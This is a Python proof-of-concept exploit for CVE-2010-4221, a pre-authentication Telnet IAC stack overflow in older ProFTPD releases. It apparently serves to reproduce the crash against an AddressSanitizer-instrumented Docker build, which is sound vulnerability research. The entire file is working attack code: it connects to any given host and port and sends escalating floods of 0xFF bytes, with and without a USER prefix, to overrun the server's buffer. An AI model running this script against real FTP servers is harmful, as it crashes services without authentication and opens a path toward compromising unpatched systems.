#!/usr/bin/env python3
"""PoC: CVE-2010-4221 - ProFTPD <=1.3.3b Telnet IAC stack buffer overflow.

Pre-auth stack-based buffer overflow in pr_netio_telnet_gets() (src/netio.c).
The server processes Telnet IAC (0xFF) escape bytes while reading EVERY command
line, before authentication. A flood of IAC bytes overruns the fixed pbuf->buf
because 1.3.3a lacks the remaining/toread bounds check added in 1.3.3c.

Trigger (per Metasploit ftp/proftpd_telnet_iac and ExploitDB 15449/16851):
a long run of 0xFF bytes on a single command line. No login required.

Against an ASan-instrumented build this corrupts the redzone and produces an
AddressSanitizer report in `docker logs` whose frame names pr_netio_telnet_gets.

Usage: ftp_proftpd_cve_2010_4221_real_poc.py [host] [port]
"""

import socket
import sys
import time


def fire(host: str, port: int, prefix: bytes, count: int) -> None:
    """One fresh connection, read banner, send an IAC flood."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    try:
        s.connect((host, port))
        try:
            banner = s.recv(1024)
            print(f"  [{count:>5} IAC, prefix={prefix!r}] banner: {banner[:60]!r}")
        except (TimeoutError, OSError):
            print(f"  [{count:>5} IAC] no banner (server may already be dead)")
        payload = prefix + b"\xff" * count + b"\r\n"
        s.sendall(payload)
        # Send a follow-up command to force the server to keep reading the
        # (already overflowed) buffer; on a healthy server this is harmless.
        try:
            s.sendall(b"\xff" * count + b"\r\n")
        except OSError:
            pass
        try:
            resp = s.recv(1024)
            print(f"  -> response: {resp[:60]!r}")
        except (TimeoutError, OSError) as exc:
            print(f"  -> no response ({exc}); connection likely crashed (expected)")
    except OSError as exc:
        print(f"  -> connect/send error: {exc}")
    finally:
        s.close()


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 12210
    print(f"[*] CVE-2010-4221 PoC against {host}:{port}")
    # Each fresh connection forks a fresh child; try several flood lengths and
    # both a bare flood and a USER-prefixed flood.
    for count in (1024, 2048, 4096, 8192):
        fire(host, port, b"", count)
        time.sleep(0.3)
        fire(host, port, b"USER ", count)
        time.sleep(0.3)
    print("[*] Done. Check `docker logs` for an AddressSanitizer report in netio.c.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
